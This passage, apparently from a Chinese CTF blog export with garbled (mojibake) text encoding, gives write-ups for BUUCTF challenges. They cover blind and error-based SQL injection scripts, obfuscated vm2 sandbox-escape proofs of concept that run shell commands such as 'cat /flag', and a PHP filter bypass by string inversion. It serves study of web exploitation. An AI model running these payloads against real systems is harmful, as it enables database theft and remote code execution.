<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givf_grasdpa_pa_pa_pa</span><br></pre></td></tr></table></figure>

<p>ä¹‹åè¿›ä¸€æ­¥å´å¾ˆéš¾äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“è¯¥æ€ä¹ˆæŸ¥è¯¢ä¸œè¥¿ï¼Œå› ä¸ºinformation_schmeaè¢«è¿‡æ»¤æ‰äº†ï¼Œæ•…åªèƒ½è€ƒè™‘å…¶ä»–æ³¨å…¥ï¼Œåˆ†åˆ«å°è¯•å¯¹innobå’Œsysåº“è¿›è¡Œæ³¨å…¥ï¼ŒæŒ¨ä¸ªå°è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br></pre></td></tr></table></figure>

<p>æ„é€ è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥è¡¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sql =<span class="string">&quot;if(ascii(  substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()  ),&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j) <span class="comment"># æ•°æ®è¡¨</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users233333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¹‹åæˆ‘ä»¬å› ä¸ºè¢«è¿‡æ»¤äº†oræ— æ³•è·å–è‡ªåŠ¨çš„åå­—ï¼Œåªèƒ½è¿›è¡Œæ— åˆ—åæ³¨å…¥çš„æ“ä½œäº†</p>
<p>é¦–å…ˆå­¦ä¹ äº†ä¸€æ³¢å¸ˆå‚…çš„æ€è·¯ï¼š</p>
<p>åˆ©ç”¨asciiä½çš„åç§»ï¼Œåœ¨æœ¬åœ°è¿›è¡Œå°è¯•</p>
<p><img src="image-20201119145415713.png" alt="image-20201119145415713"></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ å¦‚æœselect b &gt;select aï¼Œå¦‚æœselect b &gt; select aè¿”å›çš„0</p>
<p>ä¹‹åè¿˜å¯ä»¥è¿›ä¸€æ­¥çš„å»æ„é€ æ‹¼æ¥ï¼š</p>
<p><img src="image-20201119145730124.png" alt="image-20201119145730124"></p>
<p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ„é€ å‡ºflagä¹‹åä¸€æ­¥ä¸€æ­¥çš„ä½ç§»æ¨ç®—å³å¯</p>
<p>è¿™é‡Œè´´ä¸Šå¸ˆå‚…çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res += flag</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        hexchar = add(flag + <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰äºŒåˆ†æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_flag=<span class="string">&#x27;1^((1,\&#x27;&#123;&#125;\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        k = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = payload_flag.<span class="built_in">format</span>(k)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        print(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid ==<span class="number">33</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid<span class="number">-1</span>)</span><br><span class="line">    print(flag.lower())<span class="comment">#å› ä¸ºå‡ºæ¥çš„flagæ˜¯å¤§å†™ï¼Œè¿™è¾¹å…¨éƒ¨è½¬ä¸ºå°å†™</span></span><br><span class="line">    </span><br><span class="line">print(flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥"><a href="#è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥" class="headerlink" title="è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥"></a>è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020JustEscape</title>
    <url>/2020/12/17/HFCTF2020JustEscape/</url>
    <content><![CDATA[<p>ä¸€é“VM2çš„æ²™ç®±é€ƒé€¸..</p>
<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>æ²™ç®±é€ƒé€¸</li>
<li>Payloadæ‹¼æ¥(?)</li>
</ul>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>è¿™é“é¢˜ç›®ä¼ªè£…æˆPHPæ˜¯çœŸæ»´æ¶å¿ƒï¼Œé¦–å…ˆæˆ‘ä»¬è®¿é—®å¯ä»¥å¾—åˆ°ä¸€ä¸ªç”¨Vueæ¡†æ¶å†™çš„é¡µé¢ï¼š</p>
<p><img src="image-20201217143745895.png" alt="image-20201217143745895"></p>
<p>å°è¯•ç›´æ¥è®¿é—®index.phpçš„è¯å¯ä»¥å¾—åˆ°ä¸€æ®µphpæºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœä½ å°±ä¼šå‘ç°è¿™ä¸ªcodeæ˜¯æ²¡åŠ $ç¬¦å·çš„ä¹Ÿå°±æ˜¯è¯´ä»–æ²¡ç”¨..é‚£ä¹ˆå†å›åˆ°ä¹‹å‰çš„codeçš„éƒ¨åˆ†ï¼Œå¤§æ¦‚ä¹Ÿæ˜¯çœŸçš„evaläº†è¿™æ®µä»£ç ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯Javascript</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?code=<span class="built_in">Error</span>().stack</span><br></pre></td></tr></table></figure>



<p><img src="image-20201217144354519.png" alt="image-20201217144354519"></p>
<p>æœç„¶æ˜¯JSï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯VM2çš„æ²™ç®±ï¼Œé‚£ä¹ˆå¦‚ä½•æ²™ç®±é€ƒé€¸å‘¢ï¼ŸğŸ‘´ä¸€ç‚¹JSä¹Ÿä¸æ‡‚ï¼Œæ²¡æ³•å­åªèƒ½å»GITHUBä¸Šå«–ï¼Œæ‰¾åˆ°ï¼š</p>
<p><a href="https://github.com/patriksimek/vm2/issues/225">vm2æ²™ç®±é€ƒé€¸</a>ï¼Œå¯ä»¥çœ‹åˆ°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¤åˆ¶ç²˜è´´ã€</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>å¥½çš„æ‰“ä¸è¿‡ï¼Œå€’åœ°åªèƒ½çœ‹WPäº†ï¼Œåˆ«äººç»™å‡ºçš„POCï¼š</p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ƒ..?è¿™é‡Œçœ‹èµ·æ¥æ˜¯è¿›è¡Œäº†æ‹¼æ¥ï¼Œè‡ªå·±ä¸æ‡‚åŸç†çš„è¯å°±å…ˆå­¦ä¼šæ€ä¹ˆæ‹¼æ¥payloadå§,åœ¨JSä¸­æˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·æ¥ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å·ï¼š</p>
<h3 id="çš„è¯­æ³•"><a href="#çš„è¯­æ³•" class="headerlink" title="`çš„è¯­æ³•"></a>`çš„è¯­æ³•</h3><p>ES6 æ¨¡æ¿å­—ç¬¦ä¸²(Template String)æ˜¯å¢å¼ºç‰ˆçš„å­—ç¬¦ä¸²ï¼Œç”¨åå¼•å·(`)æ ‡è¯†ï¼Œå®ƒå¯ä»¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²ï¼Œæˆ–è€…åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡ã€‚<a href="https://www.cnblogs.com/alummox/p/11343269.html">ä»‹ç»åšå®¢</a>,ä»æ­¤å¤„æˆ‘ä»¬å¯ä»¥å¾—åˆ°åå¼•å·ä½œç”¨ï¼š</p>
<ul>
<li>ä»£æ›¿å­—ç¬¦ä¸²çš„åŒå¼•å·å’Œå•å¼•å·</li>
<li>å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•çš„å ä½ç¬¦</li>
<li>é…åˆ${}ç¬¦å·å¯ä»¥åŒ…å«å˜é‡</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<p>åŸæœ¬æˆ‘ä»¬è¾“å‡ºå¤šè¡Œå­—ç¬¦ä¸²åº”è¯¥è¿™æ ·æ¥å†™ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;string text line 1\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;string text line 2&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨åå¼•å·ä¹‹å:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20201217151045490.png" alt="image-20201217151045490"></p>
<p>å½“å…¶ä¸${}æ­é…ä¹‹åæ›´æ˜¯å¯ä»¥å¤§å¤§é™ä½æˆ‘ä»¬ä¹¦å†™å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–é—®é¢˜ï¼š</p>
<p><img src="image-20201217151200088.png" alt="image-20201217151200088"></p>
<p>é‚£ä¹ˆç°åœ¨å›åˆ°é¢˜ç›®æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‹¼æ¥å˜é‡è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å…ˆç”¨åå¼•å·å°†éœ€è¦çš„ä¸œè¥¿åŒ…å«èµ·æ¥ï¼Œå†ç”¨${}å³å¯è¡¨ç¤ºä¸ºä¸€ä¸ªå˜é‡ï¼š</p>
<p><img src="image-20201217151634833.png" alt="image-20201217151634833"></p>
<h3 id="çš„è¯­æ³•-1"><a href="#çš„è¯­æ³•-1" class="headerlink" title="[]çš„è¯­æ³•"></a>[]çš„è¯­æ³•</h3><p>å¦‚æœä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨ç‚¹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]æ¥ç»•è¿‡ï¼š<a href="https://blog.csdn.net/qq_39125684/article/details/80327218">JSä¸­çš„ä¸­æ‹¬å·</a></p>
<p>è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ä»»æ„çš„ç»•è¿‡å…³é”®å‚æ•°åŒ¹é…ï¼Œæ‹¼æ¥å‡ºä¸Šå›¾çš„Payloadäº†</p>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h2><p>åˆ©ç”¨joinæ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function">()=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JSå½“ä¸­ä½¿ç”¨join()ä¸­æ·»åŠ å‚æ•°æ¥å†³å®šå¦‚ä½•æ‹¼æ¥ï¼Œå¦‚æœä¸æ·»åŠ é»˜è®¤ç”¨,åˆ†å‰²å¼€æ¥ï¼Œå¦‚æœä¸º0å°±ä¼šæ‹¼æ¥åœ¨ä¸€èµ·äº†</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC 3"></a>POC 3</h2><h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="VM2æ²™ç®±é€ƒé€¸åŸç†"><a href="#VM2æ²™ç®±é€ƒé€¸åŸç†" class="headerlink" title="VM2æ²™ç®±é€ƒé€¸åŸç†"></a>VM2æ²™ç®±é€ƒé€¸åŸç†</h1><p><a href="https://www.anquanke.com/post/id/207291">å…ˆä¸¢åœ¨è¿™ï¼Œä¸æ•¢ç¢°æˆ‘npmç¯å¢ƒç°åœ¨</a></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Javascirpt</tag>
        <tag>vm2æ²™ç®±é€ƒé€¸</tag>
      </tags>
  </entry>
  <entry>
    <title>ISITDTU2019_EasyPHP</title>
    <url>/2021/03/26/ISITDTU2019-EasyPHP/</url>
    <content><![CDATA[<p>å¼€å±€ç»™å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_ = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>open_basedirï¼šé™å®šèƒ½æ“ä½œçš„ç›®å½•</p>
<p>ç”¨è¿™ä¸ªç½‘ç«™æµ‹è¯•åŒ¹é…äº†ä»€ä¹ˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;regex101.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç½‘ç«™å°±æ˜¯è¿™ä¸ªå¥½ï¼š</p>
<p><img src="image-20210326113348661.png" alt="image-20210326113348661"></p>
<p>çœ‹äº†å¤§ä½¬çš„WPçŸ¥é“è¿™ä¸ªæ“ä½œï¼Œæ„Ÿè§‰å¾ˆæœ‰ç”¨è®°ä¸‹æ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$array=get_defined_functions();<span class="comment">//è¿”å›æ‰€æœ‰å†…ç½®å®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥å¿«é€Ÿæ‰¾åˆ°æœ‰å“ªäº›å‡½æ•°å¯ä»¥ç”¨äº†ï¼Œä¸è¿‡è¿™é“é¢˜ç»™å‡ºçš„å‡½æ•°å¹¶ä¸èƒ½ç”¨ã€‚</p>
<p>é‚£å°±åªèƒ½å–åæ¥æ“ä½œäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0f224c84-f3b8-42e4-9dd3-755cd38520eb.node3.buuoj.cn&#x2F;</span><br><span class="line">?_&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æˆåŠŸäº†,æŸ¥ä¸€ä¸‹disablefunctionï¼Œ</p>
